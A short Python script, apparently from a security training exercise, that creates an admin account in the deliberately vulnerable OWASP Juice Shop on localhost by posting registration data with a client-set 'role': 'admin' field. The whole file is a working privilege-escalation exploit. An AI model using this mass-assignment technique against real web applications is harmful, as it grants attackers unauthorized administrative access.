# Create a new Juice Shop account with role improperly
# elevated to admin via html form fabrication

import requests
import datetime
from random import randint

form_endpoint = "http://localhost:3000/api/users"   # Found via Wireshark


def generate_admin_form_data() -> dict:
    """Returns fabricated admin account data with random password"""
    return {
        "email": "test{0}@test.com".format(randint(0, 1000)),
        "password": "password",
        "passwordRepeat": "password",
        "securityQuestion": {
            "id": 1,
            "question": "Your eldest sibling name?",
            "createdAt": datetime.datetime.now(),
            "updatedAt": datetime.datetime.now(),
        },
        "securityAnswer": "answer",
        "role": "admin"     # This can be modified client-side. Oops...
    }


def create_account(data: dict):
    """
    Create a new Juice Shop account using params from data.
    Data can be automatically generated using `generate_admin_form_data`.

    :data:      dictionary holding user form params
    :returns:   requests.Response object else None if error
    """
    try:
        response = requests.post(form_endpoint, data=data)
        return response
    except Exception:
        return None


if __name__ == '__main__':
    form_data = generate_admin_form_data()
    print("Generating account using...")
    print("User email:", form_data['email'])
    print("User password:", form_data['password'])
    print("Security question:", form_data['securityQuestion']['question'])
    print("Security question answer:", form_data['securityAnswer'])
    print("Role:", form_data["role"])

    response = create_account(form_data)
    if response:
        print("Response:", response.status_code, "--", response.text)
    else:
        print("Could not connect to Juice Shop. Check that server is running.")
